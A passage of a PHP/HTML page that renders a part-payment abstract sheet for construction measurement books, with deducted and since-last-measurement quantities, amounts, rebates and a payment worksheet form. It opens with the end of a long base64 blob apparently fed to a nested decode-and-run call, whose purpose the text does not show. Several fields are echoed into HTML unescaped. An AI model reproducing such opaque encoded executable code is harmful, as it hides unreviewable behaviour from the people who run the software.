rvzq1xzGdOkqTWtWa6zBiJgFLz3yEnrASmU/dkyJH+zuTjP7akIbzoTSv6U0LYn+9nu/MEysQKIFtdX+07CFByjXg1+AAtt1h2pBiEg7vD/xi80XwJlbhabOthgaDaroVg48p+kaMJLy7N5U/8pN+9dHdOU4AQS+rMEfY3mD0GvvC4M9wL7gYTGz3Q6ULDB2JpWjCQ9hKyPLwlTG2pM9vd0xTw/bev2cs+rGFOW2XSx43y8UvrWQgO1y4ppV9ucEShP4+rF6S6i1RxX6OmPneLCLL2t4lEcBfMTjtltbANI74ibfpgdjkW5j3BnRpQ/TVibD1SKCCggSk1spilbKzy6Tozw7m4IGKskqPu0DjNeH5cD4w6Z+pL9BJAZbrY0uPpPAs05NfnUT0GJ7tDDgVE/bHDnrJ4JMybm9vCt8a7X3bIJPzNkv7wYsUK0fymS+FtHGZMJIcr++jGs1H5wM5iQ/S+5xVuy3hedgwxES/T5hsUtehPSS/sdx0dl++3Tnt+E4B1hFt8SoVv6PxpNTWXvzyhNuwhdsjV61JetXZIt6UWR70SqXtlxdQAORyJ5r3tfB5uqBBZD34+tV1nHkMNLsQangZpDuuzS7AbzxbNEihlkeLV2xbVnhGp1Bm1wRU14psXR5qQkL3gc8//BKG8/7yjyMPMUqoKTCFdbZVuSI/uEkPWav8Y88hi+1dCc/Q9j8YnuSaF/pZjDc99PI0mufqd5OHDcE6sYPYOGzZfXRbP21JtNLsp+ldw3tmdJMgZBcr0rojzqul14cHG4C4XcbivWU7HU6vJe50uoweXxTDi/b4pTDMNPFMjd4n4EXdq74GooTG8cAtcoIXwBZrZUkiGytP4Xw0cgrHm7z3//z/v3vfwE=')))));
if($slm_cnt == 0)
{
	$slm_str = "";
}
if($dpm_cnt == 0)
{
	$dpm_str = "";
}
$item_str = $slm_str."@@@".$dpm_str;
$slm_str = ""; $dpm_str = "";
$checkbox_str = $subdivid."*".$subdivname."*".$description."*".$slm_measurement_qty."*".$dpm_measurement_qty."*".$rate."*".$unit."*".$abstsheetid;

//--*************THIS PART IS FOR " PRINT " Item Name, Description and Check Box  SECTION********************//
?>
<input type="hidden" name="hid_item_str" id="hid_item_str<?php echo $subdivid; ?>" value="<?php echo $item_str; ?>" />
<tr border='1' bgcolor="">
	<td  align='center' width='' class='labelsmall' style=" border-top:2px solid #0A9CC5; border-bottom:2px solid #0A9CC5;" id="td_popupbutton<?php echo $table_group_row; ?>">
		<input type="checkbox" name="check" id="ch_item" value=""  />
	</td>
	<td width="61px" align="center" style="border-top:2px solid #0A9CC5;" class="">
		<?php echo $subdivname;?>
	</td>
	<td colspan="8" style="border-top:2px solid #0A9CC5;" class="">
		<?php echo $description; ?>
	</td>
	<td style="border-top:2px solid #0A9CC5;" width="40px">&nbsp;</td>
	<td style="border-top:2px solid #0A9CC5;" width="40px">&nbsp;</td>
	<td style="border-top:2px solid #0A9CC5;" width="40px">&nbsp;</td>
</tr>
<?php 
$rowcount++;
//--*************THIS PART IS FOR " PRINT " DEDUCT PREVIOUS MEASUREMENT ( D.P.M. ) SECTION*****************//
	$QtyDpmSlm_4 = 0;	$PercDpmSlm_4 = 0;	$Dpm_Slm_Amount_4 = 0;	$total_percent_dpm_slm_4 = 0;
	$QtyDpmSlm_3 = 0;	$PercDpmSlm_3 = 0;	$Dpm_Slm_Amount_3 = 0;	$total_percent_dpm_slm_3 = 0;
	$QtyDpmSlm_2 = 0;	$PercDpmSlm_2 = 0;	$Dpm_Slm_Amount_2 = 0;	$total_percent_dpm_slm_2 = 0;
	$QtyDpmSlm_1 = 0;	$PercDpmSlm_1 = 0;	$Dpm_Slm_Amount_1 = 0;	$total_percent_dpm_slm_1 = 0;

	if($dpm_cnt > 0)
	{
		$eplodedpm = explode("*", rtrim($dpm_mesurementbook_details,"*"));
		 $DpmTemp = 0;
		for($x4=0; $x4<count($eplodedpm); $x4+=13)
		{
			$dpmqty 				= $eplodedpm[$x4+1];
			//echo $dpmqty."<br/>";
			$remarks 				= $eplodedpm[$x4+10];
			$rbnDpm					= $eplodedpm[$x4+11];
			$MeasurementbookidDpm	= $eplodedpm[$x4+12];
			$paymentpercent_dpm 	= $eplodedpm[$x4+7];
			$dpmamt 				= $dpmqty * $rate * $paymentpercent_dpm / 100;
			$dummy=0;
			if(in_array($MeasurementbookidDpm, $DpmArrMbidList)) 
			{
				$ArrUniqueVal 		= array_unique($DpmArrMbidList);
				$UniqueCount 		= count($ArrUniqueVal);
				$x6=0;
				$count_1 			= count($DpmArrAmbList);
				$count_2 			= count($DpmArrAmbPgList);
				$AMBookNo 			= $DpmArrAmbList[$count_1-1];
				$AMBookPage 		= $DpmArrAmbList[$count_2-1];
				while($x6<=$UniqueCount)
				{
					$StartKey 		= $ArrUniqueVal[$x6];
					$PaidDpmPerc 	= $DpmArrPercent[$StartKey];
					$rowspancnt 	= $UniqueCount+$DpmTemp;
					$DpmKeyresult	= checkPartpayment($DpmArrMbidList,$StartKey);
					$DpmPercSum 	= $PaidDpmPerc;
					if($DpmKeyresult != "")
					{
						$explodeDpmKeyresult = explode("*",$DpmKeyresult);
						for($x7=0; $x7<count($explodeDpmKeyresult); $x7++)
						{
							$key = $explodeDpmKeyresult[$x7];
							$DpmPercSum = $DpmPercSum + $DpmArrPayPercentList[$key];
						}
						if(($x6 == 0)&&($DpmTemp == 0))
						{
						$DpmQuantityty_1 = $DpmArrQuantityList[$key];
						$DpmAmount_1 = $DpmQuantityty_1 * $rate * $DpmPercSum /100;
							if(in_array($StartKey, $SlmArrMbidList))
							{
								$Arrkey = array_search($StartKey, $SlmArrMbidList);
								$QtyDpmSlm_1 = $SlmArrQuantityList[$Arrkey];
								$PercDpmSlm_1 = $SlmArrPayPercentList[$Arrkey];
								$Dpm_Slm_Amount_1 = $QtyDpmSlm_1 * $PercDpmSlm_1 * $rate/100;
							}
						$total_percent_dpm_slm_1 = $DpmPercSum+$PercDpmSlm_1;
						
?>
					<tr border='1' bgcolor="#FFFFFF">
						<td  align='center' width='' 		class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='right'   width='180px' 	class='' rowspan="<?php echo $rowspancnt; ?>"><?php echo "Prev-Qty Vide";//.$AbstractMbookPageNo."/Abstract MB No.".$AbstractMbookNo; ?>&nbsp;</td>
						<td  align='right' 	width='' 		class='' rowspan="<?php echo $rowspancnt; ?>"><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
						<td  align='left' 	width='' 		class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='left' 	width='' 		class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='right' 	width='' 		class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='right' 	width='' 		class='' rowspan="<?php echo $rowspancnt; ?>"></td>
						<td  align='right' 	width='' 		class=''><?php echo $QtyDpmSlm_1; ?></td>
						<td  align='right' 	width='' 		class=''><?php echo number_format($DpmAmount_1, 2, '.', ''); $dpm_amount_item  = $dpm_amount_item + $DpmAmount_1;?></td>
						<td  align='right' 	width='6%' 		class='' rowspan=""></td>
						<td  align='right' 	width='3%' 		class='' rowspan="">
							<?php
							if(in_array($StartKey, $SlmArrMbidList))
							{
								echo number_format($Dpm_Slm_Amount_1, 2, '.', ''); 
								$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_1;
							} 
							?>
						</td>
						<td  align='center' width='40px' class='' rowspan="" style="font-size:9px;">
							<?php 
							if(in_array($StartKey, $SlmArrMbidList))
							{
								echo $total_percent_dpm_slm_1."% Paid"; 
							}
							?>
						</td>
					</tr>

<?php					$rowcount++;	
						}
						
						else
						{
							if(in_array($StartKey, $SlmArrMbidList))
							{
								$Arrkey = array_search($StartKey, $SlmArrMbidList);
								$QtyDpmSlm_2 = $SlmArrQuantityList[$Arrkey];
								$PercDpmSlm_2 = $SlmArrPayPercentList[$Arrkey];
								$Dpm_Slm_Amount_2 = $QtyDpmSlm_2 * $PercDpmSlm_2 * $rate/100;
								$total_percent_dpm_slm_2 = $DpmPercSum+$PercDpmSlm_2;
								
							}
							else
							{
								$QtyDpm_5 = $DpmArrQuantityList[$key];
								$Dpm_Slm_Amount_2 = $QtyDpm_5 * 100 * $rate/100;
							}
?>
							<tr border='1' bgcolor="#FFFFFF">
								<td  align='right' width='' class=''><?php echo $DpmArrQuantityList[$key]; ?></td>
								<td  align='right' width='' class=''>
									<?php 
									echo number_format($Dpm_Slm_Amount_2, 2, '.', ''); 
									$dpm_amount_item 		= $dpm_amount_item + $Dpm_Slm_Amount_2;
									?>
								</td>
								<td  align='right' width='' class=''></td>
								<td  align='right' width='' class=''>
									<?php
									if(in_array($StartKey, $SlmArrMbidList))
									{
										echo number_format($Dpm_Slm_Amount_2, 2, '.', ''); 
										$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_2;
									} 
									?>
								</td>
								<td  align='center' width='40px' class='' rowspan="" style="font-size:9px;">
									<?php 
									if(in_array($StartKey, $SlmArrMbidList))
									{
									echo $total_percent_dpm_slm_2."% Paid"; 
									}
									?>
								</td>
							</tr>
		<?php				$rowcount++;		
						}
						
					}
					$DpmArrMbidList = removeArray($DpmKeyresult,$DpmArrMbidList);
					$x6++;	
					array_push($temp_array,$StartKey);
				}
				
			}
							//********** THIS PART IS FOR NOW PAYING (SLM) - DEDUCT PREVIOUS MEASUREMENT **********//
			$PercDpmSlm_3 = 0; 	$Dpm_Slm_Amount_4 = 0;				
			if(in_array($MeasurementbookidDpm, $temp_array))
			{
				$dummy = 1;
			}
			else
			{
				if($x4 == 0)
				{ 
					if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
					{
						$Arrkey2 = array_search($MeasurementbookidDpm, $SlmArrMbidList);
						$QtyDpmSlm_3 = $SlmArrQuantityList[$Arrkey2];
						$PercDpmSlm_3 = $SlmArrPayPercentList[$Arrkey2];
						$Dpm_Slm_Amount_3 = $QtyDpmSlm_3 * $PercDpmSlm_3 * $rate /100;
					}
					//echo $QtyDpmSlm_3 ."*". $PercDpmSlm_3 ."*". $rate."<br/>";
					$total_percent_dpm_slm_3 = $paymentpercent_dpm + $PercDpmSlm_3;
?>
					<tr border='1' bgcolor="#FFFFFF">
						<td  align='left' 	width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='right' 	width='' class='' rowspan="<?php echo $dpm_cnt; ?>"><?php echo "Prev-Qty Vide ";//.$AbstractMbookPageNo."/Abstract MB No.".$AbstractMbookNo; ?>&nbsp;</td>
						<td  align='right' 	width='' class='' rowspan="<?php echo $dpm_cnt; ?>"><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
						<td  align='left' 	width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='left' 	width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='right' 	width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='left' 	width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='right' 	width='' class=''>
							<?php 
								echo number_format($dpmqty, $decimal, '.', ''); 
							?>
						</td>
						<td  align='right' width='' class=''>
							<?php 
								echo number_format($dpmamt, 2, '.', ''); 
								$dpm_amount_item 		= $dpm_amount_item + $dpmamt;
							?>
						</td>
						<td  align='right' width='' class='' rowspan="<?php if($dummy == 1) { echo $dpm_cnt; } ?>"></td>
						<td  align='right' width='' class='' rowspan="<?php if($dummy == 1) { echo $dpm_cnt; } ?>">
							<?php 
							if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
							{
								echo number_format($Dpm_Slm_Amount_3, 2, '.', '');
								$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_3;
							}
							?>
						</td>
						<td  align='center' width='' class='' rowspan="" style="font-size:9px;">
							<?php 
								echo $total_percent_dpm_slm_3."% Paid"; 
							?>
						</td>
					</tr>	
<?php 			$rowcount++;
				}
				if(($dpm_cnt > 1) && ($x4 != 0))
				{
					if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
					{
						$Arrkey2 = array_search($MeasurementbookidDpm, $SlmArrMbidList);
						$QtyDpmSlm_4 = $SlmArrQuantityList[$Arrkey2];
						$PercDpmSlm_4 = $SlmArrPayPercentList[$Arrkey2];
						$Dpm_Slm_Amount_4 = $QtyDpmSlm_4 * $PercDpmSlm_4 * $rate /100;
					}
					$total_percent_dpm_slm_4 = $paymentpercent_dpm + $PercDpmSlm_4;
?>
				<tr border='1' bgcolor="#FFFFFF">
					<td  align='right' width='' class=''><?php echo number_format($dpmqty, $decimal, '.', ''); ?></td>
					<td  align='right' width='' class=''>
						<?php 
						echo number_format($dpmamt, 2, '.', ''); 
						$dpm_amount_item 		= $dpm_amount_item + $dpmamt;
						?>
					</td>
					<?php if($dummy == 0) 
					{
					?>
					<td  align='right' width='' class=''></td>
					<td  align='right' width='' class=''>
						<?php 
						if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
						{
							echo number_format($Dpm_Slm_Amount_4, 2, '.', '');
							$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_4;
						}
						?>
					</td>
					<td  align='center' width='' class='' rowspan="" style="font-size:9px;">
						<?php
						//if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
						//{
							echo $total_percent_dpm_slm_4."% Paid";
						//}
						?>
					</td>
					<?php 
					} 
					?>
				</tr>
<?php	
				$rowcount++;
				}
			}
			$DpmTemp++; 
		}
		//$rowcount++;
	}

//*************THIS PART IS FOR " PRINT " ---- SINCE LAST MEASUREMENT ( S.L.M. ) SECTION*******************//
	
?>
<?php
	$slm_dpm_str = $slm_measurement_qty."*".$dpm_measurement_qty;
	if($slm_cnt > 0)
	{
		$eplodeslm = explode("*", rtrim($slm_mesurementbook_details,"*"));
		for($x3=0; $x3<count($eplodeslm); $x3+=12)
		{
			$slmqty = $eplodeslm[$x3+1];
			
			$remarks = $eplodeslm[$x3+10];
			$paymentpercent = $eplodeslm[$x3+7];
			$slmamt = $slmqty * $rate * $paymentpercent / 100;
			$slm_amount_item = $slm_amount_item + $slmamt;
			if($x3 == 0)
			{
?>
		<tr border='1' bgcolor="#FFFFFF">
			<td  align='left' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>"><?php echo "Qty Vide";//.$mbpageno_slm.$mbookdescription.$mbookno_slm; ?>&nbsp;</td>
			<td  align='right' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>"><?php echo number_format($slm_measurement_qty, $decimal, '.', ''); ?></td>
			<td  align='left' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='left' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='left' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' 	width='' class=''>
				<?php 
					echo number_format($slmqty, $decimal, '.', ''); 
				?>
			</td>
			<td  align='right' width='' class=''>
				<?php 
					echo number_format($slmamt, 2, '.', ''); 
				?>
			</td>
			<td  align='center' width='' class='' style="font-size:9px;">
				<?php 
					echo $paymentpercent."% Paid"; 
				?>
			</td>
		</tr>
<?php
			}
			if(($slm_cnt > 1) && ($x3 != 0))
			{
?>
		<tr border='1' bgcolor="#FFFFFF">
			<td  align='right' width='' class=''><?php echo number_format($slmqty, $decimal, '.', ''); ?></td>
			<td  align='right' width='' class=''><?php echo number_format($slmamt, 2, '.', ''); ?></td>
			<td  align='center' width='' class='' style="font-size:9px;"><?php echo $paymentpercent."% Paid"; ?></td>
		</tr>
<?php
			$rowcount++;
			}
		}
	$rowcount++;
	}
	if($PartPayremarks != "")
	{
?>
		<tr border='1' class="label" style="font-size:10px;">
			<td colspan="12" align="left" bgcolor="#F5F5F5">Remarks &nbsp; :&nbsp;&nbsp;&nbsp;  <?php echo $PartPayremarks; ?></td>
		</tr>
<?php	
		$rowcount++;
	}	
//*************THIS PART IS FOR " PRINT " ---- TOTAL PART ( S.L.M. + D.P.M ) SECTION*******************//	
$total_qty_item = $dpm_measurement_qty + $slm_measurement_qty;
$total_amt_item = $slm_amount_item + $dpm_amount_item;
?>
	<tr border='1' class="label" bgcolor="#FFFFFF">
		<td  align='left' width='' class='' style="border-bottom-color:#0A9CC5">&nbsp;</td>
		<td  align='right' width='' class='label' style="border-bottom-color:#0A9CC5">TOTAL</td>
		<td  align='right' width='' class='' style="border-bottom-color:#0A9CC5">
		<?php echo number_format($total_qty_item, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class='' style="border-bottom-color:#0A9CC5">
		<?php echo $rate; ?>
		</td>
		<td  align='left' width='' class='' style="border-bottom-color:#0A9CC5">
		<?php echo $unit; ?>
		</td>
		<td  align='right' width='' class='' style="border-bottom-color:#0A9CC5">
		<?php echo number_format($total_amt_item, 2, '.', ''); ?>
		</td>
		<td  align='left' width='' class='' style="border-bottom-color:#0A9CC5">&nbsp;</td>
		<td  align='right' width='' class='' style="border-bottom-color:#0A9CC5">
		<?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class='' style="border-bottom-color:#0A9CC5">
		<?php echo number_format($dpm_amount_item, 2, '.', ''); ?>
		</td>
		<td  align='right' width='' class='' style="border-bottom-color:#0A9CC5">
		<?php echo number_format($slm_measurement_qty, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class='' style="border-bottom-color:#0A9CC5">
		<?php echo number_format($slm_amount_item, 2, '.', ''); ?>
		</td>
		<td  align='right' width='' class='' style="border-bottom-color:#0A9CC5">&nbsp;</td>
	</tr>
	<?php  $rowcount++; ?>
	<?php if($i != count($subdivisionlist)-1){ ?>
	<tr bgcolor="#d4d8d8" style="height:1px"><td colspan="13" style="border-top:2px solid #0A9CC5; border-bottom:2px solid #0A9CC5;"></td></tr>
	<?php } ?>
	<input type="hidden" name="row_count" id="row_count<?php echo $table_group_row; ?>" value="<?php echo $rowcount; ?>" />
	<?php
	$color_var++; $table_group_row++;
	$OverAllSlmAmount 		= $OverAllSlmAmount		+	$slm_amount_item; 
	$OverAllDpmAmount 		= $OverAllDpmAmount		+	$dpm_amount_item; 
	$OverAllSlmDpmAmount 	= $OverAllSlmDpmAmount	+	$total_amt_item;
}
	

	$SlmNetAmount 			= $OverAllSlmAmount		-	$SlmRebateAmount; 
	$DpmNetAmount 			= $OverAllDpmAmount		-	$DpmRebateAmount; 
	$SlmDpmNetAmount 		= $OverAllSlmDpmAmount	-	$SlmDpmRebateAmount;

?>
	<tr class="label" style="border-top:2px solid #0A9CC5; border-left:2px solid #0A9CC5; border-right:2px solid #0A9CC5" bgcolor="">
		<td colspan="3" align="right">Total Cost&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
	<tr class="label" style=" border-left:2px solid #0A9CC5; border-right:2px solid #0A9CC5">
		<td colspan="3" align="right">Less Over All Rebate : <?php echo $overall_rebate_perc; ?>%&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmDpmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($DpmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
	<tr class="label" style="border-bottom:2px solid #0A9CC5; border-left:2px solid #0A9CC5; border-right:2px solid #0A9CC5" bgcolor="">
		<td colspan="3" align="right">Gross Amount&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmDpmNetAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($DpmNetAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmNetAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
</table>
<input type="hidden" name="table_group_count" id="table_group_count" value="<?php echo $table_group_row; ?>" />
<input type="hidden" name="txt_sheet_id" id="txt_sheet_id" value="<?php echo $abstsheetid; ?>" />

<div align="center" class="btn_outside_sect printbutton">
	<div class="btn_inside_sect"><input type="Submit" name="Submit" value="Submit" id="Submit" /> </div>
	<div class="btn_inside_sect"><input type="button" name="Back" value="Back" id="back" class="backbutton" onclick="goBack();" /> </div>
</div> 

		<!-- modal content -->
		<div id="basic-modal-content">
			<div align="center" class="popuptitle gradientbg">Part Payment Work Sheet</div>
			<div align="center" style="padding-top:10px;">
			<table class="label table2" width="100%" cellpadding="3" cellspacing="3" id="table2">
				<tr bgcolor="">
					<td width="60px" align="left">Item No.</td>
					<td width="">
						<input type="text" readonly="" name="txt_item_no" id="txt_item_no" size="8" class="popuptextbox" />
						<input type="hidden" name="txt_item_id" id="txt_item_id" size="8" class="popuptextbox" />
					</td>
					<td width="60px" align="center">RAB No.</td>
					<td width="">
						<input type="text" name="txt_rab_no" id="txt_rab_no" size="6" class="popuptextbox" value="<?php echo $rbn; ?>" />
					</td>
					<td  align="left" colspan="4">Measurement Date - From &nbsp; :
						<input type="text" name="txt_from_date" id="txt_from_date" size="12" class="popuptextbox" value="<?php echo dt_display($fromdate); ?>" />
					To :
						<input type="text" name="txt_to_date" id="txt_to_date" size="12" class="popuptextbox" value="<?php echo dt_display($todate); ?>" />
					</td>
				</tr>
				<tr bgcolor="">
				<td width="135px" align="left">Item Description</td>
					<td width="700px" align="left" colspan="7">
						<textarea name="txt_item_desc" id="txt_item_desc" class="popuptextbox" rows="2" style="text-align:left; width:820px; height:34px;"></textarea>
					</td>
				</tr>

			</table>
			</div>
			<div style="padding-top:10px; height:325px;">
				<div style="float:left; width:567px; height:320px; overflow-y: auto;">
					<table class="label table2" cellpadding="3" cellspacing="3" width="94%" id="table3">
					<tr bgcolor="#0A9CC5" style="color:#FFFFFF">
						<td align="center" colspan="7" class="gradientbg">Deduct Previous Measurement</td>
					</tr>
					<tr>
						<td align="left" colspan="7" bgcolor="#f2efef">
						Deduct Previous Measurement Total Quantity&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;
						<input type="text" name="txt_dpm_qty" id="txt_dpm_qty" size="17" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
						<input type="hidden" name="hid_dpm_qty" id="hid_dpm_qty" size="17" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
						</td>
					</tr>
					<tr id="dpmheadrow1">
						<td width="10px" rowspan="2" align="center">RBN.</td>
						<td width="61px" rowspan="2" align="center">Item Qty.</td>
						<td width="63px" rowspan="2" align="center">Rate&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
						<td colspan="2" align="center" bgcolor="#eaeae8">Paid Details</td>
						<td colspan="2" align="center" bgcolor="#eaeae8">Payable Details</td>
					</tr>
					<tr id="dpmheadrow2">
						
						
						
						<td width="23px" align="center">(%)</td>
						<td width="110px" align="center">Amount&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
						<td width="23px" align="center">(%)</td>
						<td style='width:110px' align="center">Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
					</tr>
					<tr id="dpmtotalrow">
						<td colspan="4" align="right">Total Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>
						<!--<td colspan="6" align="right">Total Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>-->
						<td align="left"><input type="text" name="txt_partpay_total_paidamt_dpm" id="txt_partpay_total_paidamt_dpm" class="dynamictextbox" style="text-align:right; width:100px;pointer-events: none;" /></td>
						<td colspan=""></td>
						<td colspan=""><input type="text" name="txt_partpay_total_payableamt_dpm" id="txt_partpay_total_payableamt_dpm" class="dynamictextbox" style="text-align:right; width:100px;pointer-events: none;" /></td>
					</tr>
					<tr id="dpmremarksrow">
						<td colspan="7">Remarks:<br/><textarea name="txt_dpm_remarks" id="txt_dpm_remarks" class="fontcolor2" rows="3" style=" width:519px; border:1px solid #EAEAEA;"></textarea>
						</td>
					</tr>
				</table>
				</div>
				<div style="float:right;  width:427px; height:320px; overflow-y: auto;">
					<table class="label table2" cellpadding="3" cellspacing="3" width="93%" id="table4">
						<tr bgcolor="#0A9CC5" style="color:#FFFFFF">
							<td align="center" colspan="5" class="gradientbg">Since Last Measurement</td>
						</tr>
						<tr>
							<td align="left" colspan="5" bgcolor="#f2efef">
							Since Last Measurement Quantity&nbsp;:&nbsp;
							<input type="text" name="txt_slm_qty" id="txt_slm_qty" size="13" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
							<input type="hidden" name="hid_slm_qty" id="hid_slm_qty" size="13" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
							</td>
						</tr>
						<tr id="slmheadrow">
							<td width="61px" align="center">Item Qty.</td>
							<td width="63px" align="center">Rate&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i></td>
							<td width="23px" align="center">(%)</td>
							<td width="50px" align="center">Amount&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i></td>
							<td width="10px" align="center">&nbsp;</td>
						</tr>
						<tr id='rowid0'>
							<td width="61px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_qty_slm[]" id="txt_partpay_qty_slm0" class="dynamictextbox" style="text-align:right; width:93px; border: 1px solid #2aade4;" onblur="ValidateSlm(); calculateAmount(this,0,'qty','slm');" />
							</td>
							<td width="63px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_item_rate_slm" id="txt_item_rate_slm0" class="dynamictextbox" style="text-align:right; width:80px;" onblur="calculateAmount(this,0,'rate','slm');" />
							</td>
							<td width="23px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_percent_slm" id="txt_partpay_percent_slm0" class="dynamictextbox" style="text-align:right; width:40px; border: 1px solid #2aade4;" onblur="ValidatePercent(this,'slm',0); calculateAmount(this,0,'percent','slm');" />
							</td>
							<td width="50px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_amt_slm[]" id="txt_partpay_amt_slm0" class="dynamictextbox" style="text-align:right; width:130px;pointer-events: none;" />
							</td>
							<td width="10px" align="center" class="dynamicrowcell" style="text-align:center;">
							<input type="button" name="btn_add_row_slm" id="btn_add_row_slm" class="editbtnstyle" value=" + " style="width:32px; text-align:center; font-weight:bold; border-radius: 0px;" onclick="addRow();" />
							<input type="hidden" name="hid_slm_result[]" id="hid_slm_result0" class="dynamictextbox" />
							</td>
						</tr>
						<tr id="slmtotalrow">
							<td width="147px" colspan="3" align="right">Total Amount&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>
							<td width="50px" align="right"  class="dynamicrowcell">
							<input type="text" name="txt_partpay_total_amt_slm" id="txt_partpay_total_amt_slm" class="dynamictextbox" style="text-align:right; width:130px;pointer-events: none;" />
							</td>
							<td width="10px" align="center">&nbsp;</td>
						</tr>
						<tr id="slmremarksrow">
							<td colspan="5">Remarks:<br/><textarea name="txt_slm_remarks" id="txt_slm_remarks" class="fontcolor2" rows="3" style="width:99%; border:1px solid #EAEAEA;"></textarea>
							</td>
						</tr>
					</table>
				</div>
			</div>
			<div align="right">
				<table width="100%" height="65" class="label" cellpadding="3" cellspacing="3">
					<tr>
					<td align="right" width="440px">
					<label style="background:#EAEAEA; padding:6px;">Over All Total Amount</label>&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;
					<input type="text" name="txt_overall_total" id="txt_overall_total" size="20" class="dynamictextbox dynamictextbox2" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
					</td>
					</tr>
				</table>
			</div>
			<div class="bottomsection" align="center">
				<div class="buttonsection" align="center"><input type="button" name="btn_save" id="btn_save" value=" Save " class="gradientbg buttonstyle" onclick="SaveData()" /></div>
				<div class="buttonsection" align="center"><input type="button" name="btn_cancel" id="btn_cancel" value=" Cancel " class="gradientbg buttonstyle" onclick="CancelData()" /></div>
			</div>
		</div>
		
		<!-- preload the images -->
		<div style='display:none'>
			<img src='img/basic/x.png' alt='' />
		</div>     
</form>
</body>

</html>